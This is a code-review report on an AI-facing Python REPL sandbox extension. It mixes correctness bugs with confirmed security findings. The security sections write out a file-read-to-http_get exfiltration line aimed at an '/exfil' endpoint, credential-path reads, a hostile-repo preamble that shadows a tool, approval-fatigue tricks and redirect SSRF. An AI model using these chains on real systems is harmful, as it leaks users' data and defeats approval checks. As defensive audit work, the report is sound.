# repl-simple — Comprehensive Review (v2)

**Commit reviewed:** `dfc1136` (main, clean tree apart from these two review docs)
**Previous review:** commit `32fe48a`, same documents, superseded by this one
**Date:** 2026-08-12
**Method:** eight parallel read-only review agents (packaging/loadability, ReplRunner correctness, `runRlm` correctness, sandbox-refactor regression, security, test effectiveness, architecture/duplication, prior-findings sweep), synthesized and cross-verified. Conflicts between agents were re-run by hand.
**Repo state:** ~3,250 lines `src/`, 157 lines `extensions/`, 89 lines `repl/`, ~6,130 lines `test/`, 28 files.

---

## 0. Verification status — THIS HAS CHANGED

> **The suite now runs, and it is green.** `npm ci && npx tsc --noEmit && npm test` →
> **375 tests, 101 suites, 0 failures, 0 skipped, exit 0**, in 13.5 s. The claim in `dfc1136`'s
> commit message ("375 tests pass, tsc --noEmit clean") is accurate — the first reproducible green
> run in the project's history. `A1` is closed.
>
> **Every finding below was produced with `node_modules` installed and code executing.** Where the
> v1 review could only read, this one ran differential experiments against `32fe48a`, drove pi
> 0.84.1's real extension loader, executed live exfiltration through the shipped tool, and ran a
> 24-mutation campaign on a scratch copy. Several v1 claims are corrected as a result — see §8.

Confidence key:

| Tag | Meaning |
|---|---|
| `CONFIRMED` | Verified by executing code, or by reading the exact lines. |
| `UNVERIFIED` | Depends on behaviour not reproducible here; the settling experiment is stated. |
| `REFUTED` | Investigated and found NOT to be a defect. Recorded to prevent re-litigation. |

**A warning about the green suite.** Three of the four most severe findings in this review are
regressions that the 375-test suite does not detect, because `test/sandbox.test.ts` is byte-identical
to `32fe48a` and every relevant assertion in it happens to sit in the narrow window before the bug
becomes reachable. Green is now a real signal about *some* of this code. It is not yet a gate.

---

## 1. Executive assessment

The v1 review's headline was that nothing assembled the parts. **That is fixed.** `dfc1136` ships
`extensions/repl-extension.ts` (four registered Pi tools), `src/repl.ts` (`ReplRunner`, a Session
pool with composed registry), `src/rlm.ts` (a second RLM implementation), a `README.md`, and a
662-line refactor of `sandbox.ts` that genuinely eliminates the 264-line duplicate dispatch loop.
That is real work, and the structural gap the last review called "the single most consequential
finding" is closed.

What replaced it is worse in one specific way: **the code is now reachable.**

Every latent library defect in the v1 review has become a live product defect. `B2` (approval grants),
`B3` (ungated read + ungated egress), `B5` (no resource limits), and `H19` (toolstore auto-execution)
were all filed against code no user could invoke. `src/repl.ts:95-100` now wires all four into a tool
the model can call. The exfiltration path in `B3` was previously a code-reading argument; it is now a
confirmed end-to-end experiment with a byte count and a zero-prompt count.

And the refactor introduced three new blockers of its own. The extraction of `runDispatchLoop` is the
right seam and the body is a faithful move, but it converted two live closure variables into a
**by-value snapshot struct** while leaving `printCallback` and `onAbort` writing to the originals.
`acc.stdout`, `acc.stdoutTruncated`, and `acc.aborted` are read 21 times and assigned zero times. The
two dead parameters at `sandbox.ts:178-179` are the tell: the author saw the loop needed them and
never followed the wire through.

**Blockers fully fixed: 0 of 6.** B1 and B6 are partial; B2, B3, B4 are untouched; B5 regressed.
**Actionable items fully done: 2 of 32** (A1, A27 — the latter with two new regressions attached).
Nine more are partial. Three new blockers and twelve new high-severity findings are filed here.

### Scoreboard

| Dimension | v1 | v2 | Movement |
|---|---|---|---|
| Verification / CI signal | **F** | **C** | Suite runs green and reproducibly; still no CI, and `tsc` is blind to `extensions/` |
| Packaging | **F** | **D** | README added; still `private`, no `main`/`exports`/`files`; `dist/` still broken |
| Loads into Pi | **F** | **C−** | Loads via `pi package add`; **fails** via `--extension <dir>` |
| Sandbox | **C+** | **D** | H21 fixed; three new data-loss blockers introduced by the same commit |
| Session replay | **C−** | **C−** | Byte-identical; now on the shipping path, so severity is up |
| RLM loop | **D+** | **C−** | `runRlm` fixes fences/abort/salvage/context — but is a second implementation, and SUBMIT is wrong |
| Security | **D** | **D−** | Same defects, now reachable and experimentally confirmed |
| Code craft | **B** | **B−** | Real dedup; offset by two parallel RLM stacks and committed working cruft |
| Tests | **C+** | **C−** | 375 green, but 16/24 mutations survive; new tests killed 1 |

---

## 2. What `32fe48a..dfc1136` actually changed

```
 README.md                    |  79 +++++      new
 extensions/repl-extension.ts | 157 +++++++++  new — 4 Pi tools
 plan-issue-9.md              | 232 +++++++++  new — working cruft, see N9
 src/index.ts                 |  14 +
 src/repl.ts                  | 132 +++++++    new — ReplRunner
 src/rlm.ts                   | 259 +++++++++  new — second RLM implementation
 src/sandbox.ts               | 662 +++-----   refactor: runDispatchLoop extracted
 src/types.ts                 |  61 ++++       new RLM types
 test/repl.test.ts            | 274 +++++++++  new
 test/rlm.test.ts             | 796 +++++++++  new
```

Everything else — `bridge.ts`, `builtins.ts`, `registry.ts`, `rlm_loop.ts`, `rlm_tools.ts`,
`session.ts`, `toolstore.ts`, `submit_signal.ts`, `repl/repl_server.py`, `package.json`,
`tsconfig.json`, `.gitignore`, and all ten pre-existing test files — is **byte-identical**. That fact
does most of the work in §5: any v1 finding located in those files is unchanged by construction.

---

## 3. BLOCKERS

### B7 — `runDispatchLoop` returns a stale stdout snapshot: everything printed after the first tool call is silently discarded `NEW` `CONFIRMED`

`sandbox.ts:579-584` and `:725-730` build a by-value `DispatchAccumulators`; the loop reads
`acc.stdout` at `:189`, `:199`, `:220`, `:249`, `:289`, `:316`, `:346`, `:388`, `:414`, `:442`. The
`printCallback` closures at `:490-503` and `:622-632` append to the **outer** `let stdout`, which the
loop never reads again. `grep 'acc\.stdout\s*=' src/sandbox.ts` → zero hits.

Differential experiment, `print("before"); echo("m"); print("after"); 1`:

| | result |
|---|---|
| `dfc1136` | `stdout = "before\n"` |
| `32fe48a` | `stdout = "before\nafter\n"` |

Confirmed identically on the resume path. `runOpts.onPrint` still fires, so a streaming UI masks the
loss entirely — which is exactly why nothing caught it.

**Blast radius is the product's core loop.** `src/rlm.ts:146`, `src/rlm_loop.ts:323,350`, and
`src/repl.ts:109,120` all feed `result.stdout` back to a model. Any `print()` after any host-tool call
is now invisible. Since `print()` is how the RLM system prompt tells the model to inspect data
(`rlm.ts:21`), this breaks the documented workflow.

**Fix:** pass one mutable object and have `printCallback`/`onAbort` write into it — `acc.stdout += …`.
~15 lines, and it makes `maxStdout`/`printCallback` at `:178-179` legitimately unused.

### B8 — the same desync makes mid-run abort a no-op; this is a regression against `32fe48a` `NEW` `CONFIRMED`

`sandbox.ts:184` reads `acc.aborted`, frozen at `:583`/`:729`. `onAbort` at `:481-483`/`:613-615`
writes the unread outer `aborted`. Only a signal that was *already* aborted before `runInSandbox` is
ever observed — precisely the one case `test/sandbox.test.ts:410` covers.

Experiment (two 50 ms async tools, `controller.abort()` at 20 ms):

| | result |
|---|---|
| `dfc1136` | `status:"ok"`, `output:"finished"`, 2 calls — abort ignored, execution continued past it |
| `32fe48a` | `status:"error"`, `errorKind:"aborted"`, 1 call |

Before this commit, abort at least stopped the loop between pause points. Now it does nothing. This
is security-relevant: cancellation no longer halts host-tool execution.

### B9 — two of the four registered Pi tools can never succeed `NEW` `CONFIRMED`

`extensions/repl-extension.ts:28-39` — `makeOnApproval` returns `boolean` only. Suspension requires
the literal `"suspend"` (`types.ts:30`, checked at `sandbox.ts:311`, the sole occurrence in the file).
`ctx.ui.confirm` returns a boolean, and it is the only approval producer.

Therefore `status:"suspended"` is unreachable from the shipped extension, and:

- `formatResult`'s suspended branch (`repl.ts:127-131`) is dead code.
- `repl_abandon` always answers `"No pending suspension."`
- `repl_resume` on a *live* session **throws** `Error("No suspended execution to resume")`
  (`session.ts:250`), uncaught by `ReplRunner.resume` (`repl.ts:62`) — the tool call fails rather
  than returning text.

Both confirmed by execution. The model is told to call these tools by their own descriptions
(`repl-extension.ts:80-81`, `:133-134`). Note the inconsistency at `repl.ts:58-63`: a missing
*session* returns a friendly string; a missing *suspension* raises.

### B1 — `pi.extensions` still fails on one of two load paths `PARTIAL`

The missing-directory half is **fixed**: `extensions/repl-extension.ts` exists, default-exports a
factory, and pi 0.84.1's real loader registers all four tools when pointed at the **file**.

The manifest still names a **directory** (`package.json:17`), and pi has two inconsistent
implementations of `resolveExtensionEntries`:

- `package-manager.js:364` (used by `pi package add`) stats the directory and expands it to
  `extensions/*.ts`. **Works.**
- `loader.js:473-491` (used by `pi --extension <path>` and settings `extensions: [...]`) pushes
  `resolve(dir, extPath)` after an `existsSync` with **no `isFile()` check**, then hands it to
  `jiti.import()` at `:368`. **Dies.**

Executed against the real loader:

```
discoverAndLoadExtensions(["/home/adaramir/claude/repl-simple"])
  EXTENSIONS: []
  ERRORS: [{path: ".../extensions",
            error: "Failed to load extension: Cannot find module '.../extensions'"}]

# pointed at the file instead:
  EXTENSIONS: [{tools: ["repl","repl_resume","repl_reset","repl_abandon"]}]
  ERRORS: []
```

**Fix:** `"./extensions/repl-extension.ts"`. One character class.

### B2 — one approval becomes unlimited silent re-execution `STILL OPEN` `SEVERITY UP` `CONFIRMED`

`session.ts` is byte-identical. The defect is unchanged: approval is a **position-independent Set**
(`:172`, auto-approving at `:190-207` *before* the user callback) while the result cache is
**positional** (`:88-99`, falling through to `originalExecute` at `:102` once the replay cursor is
exhausted).

It is now reachable through the shipped `repl` tool (`repl.ts:41`). Measured: approve
`bash("date +%s%N")` once (1 prompt), then a later snippet `[bash("date +%s%N") for i in range(3)]`
→ **0 prompts and three distinct nanosecond timestamps** — genuinely re-executed, not replayed.
Second measurement: approve `write('f.txt','v1')` once → **7 real writes, 1 prompt total.**

Cache key is `` `${toolName}::${JSON.stringify(sortedResolvedArgs)}` `` (`session.ts:55-63`); scope is
the `Session`; no expiry, no count limit; cleared only by `repl_reset`.

**Two v1 sub-claims are REFUTED** (see §8): the grant is **not** cross-process, and `save_tool` is
**not** reachable from inside `repl`. The finding stands on the string-vs-effect binding alone: a
grant is bound to the command *string*, not to the script's *content*, so anything that changes what
that string does (the main agent rewriting the script, `PATH`, a checkout) converts one approval into
ongoing execution of new code.

### B3 — zero-prompt exfiltration, now reachable and experimentally confirmed `STILL OPEN` `SEVERITY UP` `CONFIRMED`

`repl.ts:95-97` composes the unjailed bridge tools and the ungated `http_get` into one registry.
`read`/`grep`/`find`/`ls` are `mutating: false` (`bridge.ts:53-96`) so `gateMutating` never touches
them (`:159`); `http_get` never sets `requiresApproval` (`builtins.ts:212-248`). Pi's own read path
has no cwd jail (`path-utils.js:40-46` — absolute, `~`, and `..` all resolve).

Executed end-to-end through `ReplRunner`:

```
run("secret = read('/etc/hostname'); http_get('http://127.0.0.1:PORT/exfil?d='+secret)")
  → server log: SERVER SAW: /exfil?d=vps
  → PROMPTS: 0
```

Also confirmed ungated: `ls("/etc")`, `find("*.pub", path="~/.ssh")` → `id_ed25519.pub`,
`grep("root", path="/etc/passwd")`.

The careful symlink-checked jail in `builtins.read_file` **works** — `read_file("/etc/hostname")` →
`PermissionError: absolute paths are not allowed`, `read_file("../../../etc/hostname")` → `path
escapes the workspace root`. It is simply bypassed by using the other `read` in the same registry.
`bash` is correctly gated and is not needed for this.

### B5 — no resource limits, and abort cannot interrupt Python `STILL OPEN` `NOW WORSE` `CONFIRMED`

`sandbox.ts:145` (`if (!limits) return undefined;`) unchanged. The shipped path makes it worse:
`extensions/repl-extension.ts:61` discards the `_signal` Pi hands it, and `repl.ts:41` passes neither
`limits` nor `signal`.

Executed: `run('while True:\n    pass\n')` never returned; a 2 s `setTimeout` in the same process
**never fired** (the synchronous WASM call blocks Node's event loop); the process required `SIGKILL`.
An earlier attempt survived a SIGTERM-based `timeout` for 120 s.

Limits *work* when supplied — `{limits:{maxDurationSecs:2}}` → `TimeoutError: time limit exceeded` in
2101 ms. A default is the only real mitigation: B8 means abort is now unusable even at the pause
points where it used to work, and a pure-Python loop yields no pause points regardless.

### B4 — `resumeSuspended`'s prologue resumes are still unguarded `STILL OPEN` `CONFIRMED`

`sandbox.ts:660`, `:692`, `:710` — the three prologue `snapshot.resume()` calls remain outside any
`try`/`catch (MontyRuntimeError)`, unlike all eleven resumes in the shared loop. **The refactor
rewrote this prologue and did not fix it.**

Executed: suspend on `gated()`, resume with `decision=false`, Python does not catch → `resumeSuspended`
**throws** `MontyRuntimeError: PermissionError` instead of returning a `RunError`. `session.ts:294`
awaits it and `this.suspended = null` sits at `:302-304`, *after* the await — so the throw skips the
clear and the session wedges permanently.

Not reachable from `repl_resume` today, purely because B9 makes suspension impossible. **Fix B4
before fixing B9**, or fixing B9 opens this.

### B6 — full context inlined into the prompt `PARTIAL`

`rlm_loop.ts:115-131` is unchanged and still inlines everything; `test/rlm_loop.test.ts:549-561`
still asserts the bug. The new `runRlm` fixes the headline: `rlm.ts:86-94` caps at 5,000 chars with a
head/tail preview, and the prompt names the `context` variable. Measured: a 20,000-char context
produces a 5,146-byte prompt. The 10 MB → 2.5 M-token failure is gone on the new path.

Residual: contexts ≤5,000 chars are still inlined in full; the model is never told the true length or
line count; the elision marker is a bare `\n...\n` inside a fence, indistinguishable from data; and
**only the key `context` is announced** — with `inputs: {context, other_data}`, `other_data` is never
mentioned anywhere.

---

## 4. HIGH — new in this diff

### H24 — a *failed* `SUBMIT` ends the RLM run and returns the TypeError text as the final answer `CONFIRMED`

`rlm.ts:242` — `result.calls.find(c => c.tool === "SUBMIT")` ignores `c.ok`. `sandbox.ts:262-283`
pushes a SUBMIT trace with `ok:false` when `resolveToolArgs` throws, then raises `TypeError` into
Python. The comment two lines above (`rlm.ts:240-241`) explicitly says *"and a SUBMIT call in the
trace with `ok:true`"* — **the code contradicts its own comment.**

```
model emits: SUBMIT("a", answer="b")
  → {status:"ok", answer:"SUBMIT() got multiple values for argument 'answer'"}

model emits: try: SUBMIT("a", answer="b")
             except TypeError: pass
             "GARBAGE"
  → {status:"ok", answer:"GARBAGE"}      ← last expression value, presented as the final answer
```

The loop should have fed the TypeError back and let iteration 2 submit properly. `rlm_loop.ts:151`
gets this right by guarding on `status === "ok"`. **Fix:** `c.tool === "SUBMIT" && c.ok`.

### H25 — `SUBMIT()` with no argument returns `undefined` in a `string`-typed field `CONFIRMED`

The full H13 chain survives into `rlm.ts`. Measured stub output with RLM tools registered:

```
def llm_query(prompt: str) -> str: ...
def rlm_query(query: str, context: str | None = None) -> str: ...
SUBMIT: Any = None            ← `returns:"void"` is not a Python name; the stub degrades to Any
```

So the type checker cannot catch `SUBMIT()`; `resolveToolArgs` does not enforce required params;
`sandbox.ts:380` sets `output: err.answer` bypassing `formatOutput`. Executed: `SUBMIT()` →
`{status:"ok", output: undefined}`; `SUBMIT(42)` → `output: 42` (a number). `RunOk.output` is declared
`string` at `types.ts:69`, and `runRlm` forwards both straight into `RlmResult.answer`.

### H26 — the toolstore preamble can shadow host tools; a hostile repo is code execution on first `repl` call `CONFIRMED`

`repl.ts:99-100` calls `loadSavedTools({root: cwd})` on every session creation and injects the raw
concatenated source of every `.py` under `<cwd>/.pi/code-tools` as a preamble, executed before user
code on every run (`session.ts:163-166`), with full host-tool access and no approval.

Executed with `.pi/code-tools/evil.py` containing
`print("PWNED from preamble")` and `def read_file(path): return "SHADOWED"`:

- first `repl` call (code `1+1`) printed `PWNED from preamble`
- `read_file('anything')` returned `SHADOWED` — the jailed builtin was silently intercepted

Host tools only resolve for names Python has not bound (`sandbox.ts:205-227`), and the preamble runs
first, so shadowing is systematic rather than incidental. A separate run confirmed preamble code
calling a host tool with **zero** approval callbacks.

`.pi/` is not in `.gitignore`. **The delivery vector is a cloned repo, not `save_tool`** — and since
`repl.ts` deliberately omits `createToolStoreTools`, the model cannot `read_tool` or `delete_tool`
what is executing. Read side shipped, write side withheld.

### H27 — every `repl` call re-emits all prior stdout; past 256 KB the *new* output is discarded `CONFIRMED`

`session.ts:161-166` replays the whole transcript on every run, and nothing de-duplicates stdout
(`filterCachedCalls` de-duplicates only the *tool trace*).

```
run1 -> "alpha\n\n[result]\nNone"
run2 -> "alpha\nbeta\n\n[result]\nNone"
run3 -> "alpha\nbeta\ngamma\n\n[result]\nNone"
```

With a large early print, this becomes destructive: `print('Z'*300000)` then
`print('IMPORTANT-NEW-OUTPUT')` → the second call returns **262,180 bytes** of stale `Z`s ending in
`[...stdout truncated]`, and `IMPORTANT-NEW-OUTPUT` is **absent**. Every subsequent call in that
session is permanently a 256 KB blob of stale output with the model's actual result missing. Only
`repl_reset` recovers.

### H28 — the advertised `repl_server.py` preamble fails type-check on 100% of iterations `CONFIRMED` `REGRESSION`

`rlm_loop.ts` always injected `context: context ?? ""`. `rlm.ts:187-192` injects inputs **only if the
caller passes `options.inputs`**. `repl/repl_server.py:62-89` references the bare name `context`, so
without the input declaration `buildTypeCheckPrefix` emits no `context: Any = None` and the type check
fails.

Executed with `{preamble: replServer}` and no inputs: a ~4 KB, 12-error `unresolved-reference` failure
on iteration 1 — deterministic, so all 10 iterations fail identically while `buildFeedback` re-sends
the whole 4 KB blob each time. **The advertised production configuration is a guaranteed
10-iteration no-op.** `test/rlm.test.ts:87` loads `REPL_SERVER` and never uses it.

### H29 — tool aliasing raises `NameError: name 'SENTINEL' is not defined` `CONFIRMED`

Verified by hand:

```
echo("hi")           → ok, "hi"
f = echo; f("hi")    → error/runtime: NameError: name 'SENTINEL' is not defined
```

Any aliasing, higher-order use (`map(read_file, paths)`), or storing a tool in a dict fails, and the
error leaks an internal identifier the model cannot act on. Pre-existing in mechanism; the refactor
renamed the sentinel from `sentinel` to `SENTINEL` (`sandbox.ts:35`), changing the leaked token.
Nothing tests it.

### H30 — `tsconfig.json` excludes `extensions/`, so the only user-facing file is never type-checked `CONFIRMED`

`tsconfig.json:11` — `include: ["src/**/*.ts","test/**/*.ts"]`. `tsc --listFilesOnly` yields **zero**
files under `extensions/`. Type-checking it directly fails:

```
extensions/repl-extension.ts(2,22): error TS2307: Cannot find module 'typebox'
```

The green `tsc --noEmit` is therefore a false negative for the entire shipping entry point: a rename
of `ReplRunner.abandon`, a signature drift against pi's `ToolContext`, or a `defineTool` change can
never be caught. `plan-issue-9.md:16` explicitly listed this tsconfig change as required work; it was
not done.

(`typebox` resolves fine *under pi*, which aliases it from its own install — see §8. The type-check
gap is real regardless, and fixing it requires adding `typebox` as a devDependency.)

### H31 — two parallel RLM implementations, both exported, neither documented as canonical `CONFIRMED`

`src/rlm_loop.ts` (`RLMLoop`, 357 lines) and `src/rlm.ts` (`runRlm`, 259 lines) do the same job with
three redundant type families (`RLMLoopOptions`/`RlmOptions`, `RLMLoopResult`/`RlmResult`,
`RlmMessage` vs the inline `{role,content}` at `types.ts:112`). Both are exported from `index.ts`
(`:54-61`, `:70-75`) with no doc comment, deprecation, or README line distinguishing them. The names
differ only in casing.

Neither is more complete — and that is the problem:

| | `RLMLoop` | `runRlm` |
|---|---|---|
| Fence extraction | none (prompt forbids fences) | ✅ `rlm.ts:39-50` |
| Prompt built from real registry | ✅ `renderTypeStubs` + module probes | ❌ static string |
| Creates RLM tools + collision check | ✅ | ❌ caller must |
| SUBMIT detection | ✅ guards on `status==="ok"` | ❌ H24 |
| Abort | ❌ | ✅ (partial) |
| Progress callback | ❌ | ✅ `onIteration` |
| Nesting / `rlm_query` recursion | ✅ unique | ❌ |
| Salvage at exhaustion | ❌ | ✅ |
| LLM throw → result | ✅ | ❌ propagates |
| Python state continuity | ❌ | ❌ |

Each fixes a distinct subset of the v1 findings and leaves the other's subset open, so **no single
object in the repo carries all the fixes.** The README documents only `RLMLoop` — the one that
mishandles fences and abort. And neither is reachable from the shipped extension: both are dead code
from the product's point of view (`grep` finds consumers only in `index.ts` and tests).

### H32 — the `[result]` field is completely uncapped `CONFIRMED`

`repl.ts:112` pushes `"[result]\n" + result.output`; `formatOutput` (`sandbox.ts:198`) has no
truncation, and `maxStdoutBytes` applies only to prints. Executed: `repl` with code `'A'*2000000`
returns a **2,000,009-byte** tool result straight into the model's context. Realistic shape: a bare
`read_file('big.log')` as the last expression.

### H33 — concurrent `repl` calls on one `sessionId` silently discard a call's state `CONFIRMED`

`repl.ts:85-92` — `get` → `await createSession()` (which does disk I/O in `loadSavedTools`) → `set`.
The `await` sits between check and insert with no lock, so both callers construct a `Session` and the
second `set` orphans the first.

Executed: `Promise.all([run("x = 1","s"), run("y = 2","s")])` — both return success, but a follow-up
`print(x)` reports `Name 'x' used when not defined`. **The model is told its assignment succeeded when
it was thrown away.**

### H34 — unbounded approval-dialog spam with no cancel path `CONFIRMED`

Denial raises a catchable `PermissionError` (`sandbox.ts:322-339`) with no rate limit and no
"deny all". Executed: one `repl` call running `for i in range(20): try: bash(...) except
PermissionError: pass` produced **20 modal dialogs** and completed normally. Scale it and the session
is unusable — but the real risk is fatigue: injected code can vary the command each iteration until
the user clicks yes once, which then becomes a permanent grant (B2). Because `_signal` is discarded
(`repl-extension.ts:61`), the user cannot cancel the tool call to stop it.

### H35 — one unreadable entry in `.pi/code-tools` hard-fails every `repl` call, unrecoverably `CONFIRMED`

`repl.ts:99` — `loadSavedTools` has no `try` inside its read loop (`toolstore.ts:232-235`), and
neither `createSession`, `run`, nor the extension catches. Executed with a **directory** named
`.pi/code-tools/dir.py`: `run("1+1")` rejects with `EISDIR`. Every session id fails identically and
forever; `repl_reset` does not help, and the toolstore tools are not registered to delete it.

### H36 — `http_get` follows redirects into loopback and link-local `CONFIRMED`

`builtins.ts:223-247`. The only check is `/^https?:\/\//i` on the **initial** URL (`:225`);
`fetchImpl(url)` uses default `redirect: "follow"`; no timeout, no DNS/IP validation, no gate.

Executed: `http_get("http://<public-looking>/")` returning `302 → http://127.0.0.1:<port>/…` returned
the internal body `INTERNAL-SECRET-DATA`. `169.254.169.254` was attempted and failed only for network
reasons — **no policy blocks it**. `file://` *is* correctly rejected. The 256 KiB streaming cap with
reader cancellation (`builtins.ts:56-93`) is correct and worth keeping.

### H37 — what the sandbox did is invisible to both the user and the model `CONFIRMED`

`repl.ts:106-132` surfaces only `stdout` and `output`; `result.calls` — the `ToolCallTrace[]`
containing every ungated `read` and `http_get` — is **dropped**, and `repl-extension.ts:68` returns
`details: {}`, so Pi's UI has nothing to render either. Combined with B7 and H26, exfiltration
performed by the preamble or after any tool call leaves **no trace at all** in what the user sees.

---

## 5. Status of every v1 finding

`session.ts`, `bridge.ts`, `builtins.ts`, `registry.ts`, `rlm_loop.ts`, `rlm_tools.ts`,
`toolstore.ts`, `repl_server.py`, `package.json`, `tsconfig.json`, `.gitignore` and all pre-existing
tests are byte-identical to `32fe48a`, so every finding located in them is STILL OPEN by construction.

| ID | Status | Note |
|---|---|---|
| B1 | **PARTIAL** | Directory exists and loads via `pi package add`; `--extension <dir>` still fails |
| B2 | **STILL OPEN** ↑ | Now on the shipping path; two sub-claims refuted (§8) |
| B3 | **STILL OPEN** ↑ | Exfiltration confirmed end-to-end, 0 prompts |
| B4 | **STILL OPEN** | Survived the refactor of the very prologue it lives in |
| B5 | **STILL OPEN** ↑↑ | Worse: B8 removes the abort half that used to work |
| B6 | **PARTIAL** | Fixed in `rlm.ts`; `rlm_loop.ts` unchanged |
| H1 | **STILL OPEN** | `dist/src/rlm_loop.js` → ENOENT on `dist/repl/repl_server.py`, reproduced |
| H2 | **STILL OPEN** | No `main`/`exports`/`types`/`files`; README's import example cannot resolve |
| H3 | **STILL OPEN** | `rlm.ts:227` is a fresh `runInSandbox` per iteration; prompts imply continuity |
| H4 | **PARTIAL** | Fixed in `rlm.ts:39-50`; four fence shapes still missed (H38) |
| H5 | **STILL OPEN** ↑ | Measured at **+103** lines, not +90 — the type-check prefix was never counted |
| H6 | **PARTIAL** | `extractBestAnswer` added; no final synthesis |
| H7 | **PARTIAL** | Fixed in `rlm.ts`; new regression — abort discards all iterations (H39) |
| H8 | STILL OPEN | No global budget |
| H9 | **STILL OPEN** | Measured: 1.57 MB across 4 iterations (~390 K tokens) |
| H10 | **STILL OPEN** ↑ | `runRlm` regresses: its prompt never renders the registry at all |
| H11 | **STILL OPEN** | Now reproduced on the `repl` path too — the toolstore preamble is undisclosed |
| H12 | **STILL OPEN** | Both copies kept verbatim; `print("é"*50)` with a 10-byte cap → 42 bytes |
| H13 | **STILL OPEN** | Upgraded to CONFIRMED-by-execution; see H25 |
| H14 | **STILL OPEN** | `sandbox.ts:643-651`; compounded by B8 (the post-hoc check is dead) |
| H15–H18 | STILL OPEN | `session.ts` unchanged |
| H19 | **STILL OPEN** ↑ | Now live via `repl.ts:99`; see H26 |
| H20 | **STILL OPEN** | Confirmed by experiment; see H36 |
| H21 | **FIXED** | 971 → 731 lines, duplicate genuinely gone — but see B7/B8 |
| H22 | STILL OPEN | No `.github/`, no linter, no `engines` |
| H23 | STILL OPEN | Repo-wide attribution grep → 0 hits; `LICENSE` unchanged |
| M1–M16, L1–L9 | STILL OPEN | All in unchanged files. M13 worse: `repl.ts:94-101` rebuilds a registry per session |
| N1 | **FIXED** | Stale docblock deleted in the refactor |
| N3 | **PARTIAL** | Duplicate local sentinel hoisted to `:35`; `arg()`, `numToSkip`, `CANDIDATE_MODULES` remain |
| N2, N4–N8 | STILL OPEN | Unchanged files |

Additional new lower-severity findings: **H38** — `extractPythonCode` misses ` ```py `, ` ```Python `,
single-line fences, and fences with no newline before the close; each costs a full iteration to a
guaranteed `SyntaxError`, and with two ```python blocks it takes the **first**, so a self-correcting
model loses its correction (`rlm.ts:39-50`, all 11 cases executed). **H39** — abort throws out of
`runRlm`, discarding every completed iteration (`rlm.ts:213-216`); `rlm_loop.ts` at least returned its
transcript. **N9** — `plan-issue-9.md` (232 lines) committed at repo root, four commits after
`95ae49c` "chore: remove working plan.md" established the opposite convention; it also documents the
tsconfig change that was never made. **N10** — `README.md:31-33` lists `save_tool`/`delete_tool`/
`read_tool`/`list_saved_tools` and the RLM tools as "available Python-side tools"; inside `repl` they
are all `NameError`. **N11** — `types.ts:101` places an `import type { ToolRegistry }` mid-file,
inverting the layering (`registry.ts` imports from `types.ts`). Type-only, erased at emit, so no
runtime cycle today — but it becomes one the moment a value is needed. **N12** — `repl_reset` reports
`Session 'X' reset.` for sessions that never existed. **N13** — `sessions` is an unbounded,
model-keyed `Map` with no cap or eviction; `reset()` leaves the entry in place. **N14** — module
naming (`repl.ts` / `rlm.ts` / `rlm_loop.ts` / `rlm_tools.ts` / `repl_server.py`) is not legible.

---

## 6. Test effectiveness

**375 tests, 101 suites, 0 failures.** Real credit, restated from v1 and re-verified: **there is no
hand-rolled fake of the Python interpreter anywhere.** `test/rlm.test.ts` drives the real `runRlm` →
real `runInSandbox` → real Monty, mocking only at the `LlmClient` seam. That is the right seam, and
the `RunResult`-shape-mismatch risk does not exist — the SUBMIT trace shape is produced by
`sandbox.ts` itself.

But a 24-mutation campaign on a scratch copy scored **8 killed / 16 survived**.

| # | Mutation | Site | Result |
|---|---|---|---|
| M1 | `maxIterations ?? 10` → `?? 1` | `rlm.ts:176` | **SURVIVED** |
| M2 | loop-top abort check → `if (false)` | `rlm.ts:208` | **SURVIVED** |
| M3 | drop `&& r.output !== "None"` | `rlm.ts:106` | **SURVIVED** |
| M4 | never forward `inputs` to sandbox | `rlm.ts:187` | **SURVIVED** |
| M5 | `submitCall.error ?? ""` → `"MUTANT"` | `rlm.ts:244` | **SURVIVED** |
| M6 | `context.length > 5000` → `> 0` | `rlm.ts:88` | **SURVIVED** |
| M19 | suspended-feedback branch → `if (false)` | `rlm.ts:134` | **SURVIVED** |
| M20 | no-output feedback branch → `if (false)` | `rlm.ts:141` | **SURVIVED** |
| M21 | `scriptName ?? "rlm.py"` → `"MUTANT.py"` | `rlm.ts:193` | **SURVIVED** |
| M7 | `resume()`: `if (!session)` → `if (true)` | `repl.ts:59` | **SURVIVED** |
| M8 | `return session.abandon()` → `return true` | `repl.ts:74` | **SURVIVED** |
| M9 | `gateMutating: true` → `false` | `repl.ts:95` | **SURVIVED** |
| M22 | drop `onApproval` from `session.run` | `repl.ts:41` | **SURVIVED** |
| M11 | `> maxStdout` → `>=` | `sandbox.ts:493` | **SURVIVED** |
| M12 | `> maxStdout` → `>=` (resume copy) | `sandbox.ts:625` | **SURVIVED** |
| M14 | `if (err instanceof SubmitSignal)` → `if (false)` | `sandbox.ts:663` | **SURVIVED** |
| M10 | `[result]\n${output}` → `result.stdout` | `repl.ts:112` | KILLED |
| M13, M15–M18, M23, M24 | abort check, error-kind swap, approval check, dropped `await`, suspend branch, + 2 sanity | `sandbox.ts`, `rlm.ts` | KILLED |

**Score by file: `rlm.ts` 0/9 (excluding two sanity mutations), `repl.ts` 1/5, `sandbox.ts` 5/8.**

The decisive observation: **every kill inside `sandbox.ts` comes from `test/sandbox.test.ts` — the
file the refactor did not touch. The 1,070 lines of new tests killed exactly one mutation (M10).**

Two survivors are security-relevant: `gateMutating: true → false` (M9) and dropping the `onApproval`
callback entirely (M22) both pass the suite. `test/repl.test.ts:23-30` defines `deny`/`approve`
helpers that are **never used** — the test file's own dead code advertises the missing tests.

Tautologies, repeating A32's pattern:

- `test/rlm.test.ts:778-796` — four tests assert `DEFAULT_RLM_SYSTEM_PROMPT` (imported from the same
  repo at `:18`) has `length > 100` and contains `"SUBMIT"`, `"python"`, ` ``` `. The literal
  asserted against itself.
- `test/rlm.test.ts:130-171` — defines `onLLMQuery: async () => "four"`, asserts the result is
  `"four"`. Passes against any implementation that calls the callback.
- `test/rlm.test.ts:92-128` — restates `rlm_tools.ts`'s literals field by field; duplicates
  `test/rlm_tools.test.ts`, already graded C in v1 for the same reason. Roughly 150 of the "25+ new
  RLM tests" are re-runs.
- `test/rlm.test.ts:716-741` — titled *"suspended status treated as error"* but never calls `runRlm`;
  it calls `runInSandbox` and duplicates `sandbox.test.ts:323`. M19 proves the branch it names is
  untested.
- `test/repl.test.ts:234-237` — *"reset of non-existent session does not throw"* contains no assertion.
- Dead scaffolding in `test/rlm.test.ts`: `makeMockLlm` (`:23`), `makeRlmTools` (`:60`), `REPL_SERVER`
  (`:87`) — all defined, none referenced. ~60 lines marking an integration test that was planned and
  dropped.

